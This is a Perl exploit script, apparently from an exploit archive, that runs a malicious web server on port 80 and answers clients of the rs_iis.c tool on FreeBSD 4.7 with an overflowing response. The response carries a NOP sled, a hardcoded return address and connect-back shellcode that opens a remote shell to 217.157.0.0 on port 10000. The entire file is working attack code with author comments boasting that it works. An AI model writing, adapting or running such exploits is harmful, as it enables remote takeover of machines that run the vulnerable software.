#!/usr/bin/perl
# kokanin@dtors.net doing stuff with rs_iis.c, scode ret and bsize meant for
# FreeBSD, tested on 4.7-RELEASE-p7. connect-back shellcode ripped from bighawk
# -it's port 10000 to 217.157.0.0, and you almost certainly will want to change
# that part, change the port too if you feel like it (and can find it).
# note from rs_iis.c author:
# This code is not bullet-proof. An evil WWW server could return a response 
# bigger than MAXBUF  and an overflow would occur here. Yes, I'm lazy... :-)
# end note from rs_iis.c author.
# my god i code like shit, but it works.

use IO::Socket;
$bind_port = 80;
$nop = "\x90";
$len = 100016;
$ret = pack("l",0xbfbffe18);
$connectback = "\xd9\x9d\x00\x00";
$sleepdur = 1; # you might have to adjust this depending on net speed.
$shellcode =    "\x31\xc9\xf7\xe1\x51\x41\x51\x41\x51\x51\xb0\x61\xcd\x80\x89". 
                "\xc3\x68".$connectback."\x66\x68\x27\x10\x66\x51\x89\xe6\xb2".
                "\x10\x52\x56\x50\x50\xb0\x62\xcd\x80\x41\xb0\x5a\x49\x51\x53".
                "\x53\xcd\x80\x41\xe2\xf5\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62".
                "\x69\x6e\x89\xe3\x51\x54\x53\x53\xb0\x3b\xcd\x80";

$freebsd_string = $nop x $len . $ret x 2 . $nop x 1000 . $shellcode; 
$server = IO::Socket::INET->new(LocalPort => $bind_port,
                                Type    => SOCK_STREAM,
                                Listen  => 0)
    or die "Can't listen on $server_port : $!\n";
if ($client = $server->accept()) {
        sleep $sleepdur; 
        print $client "$freebsd_string";
}
close($client);
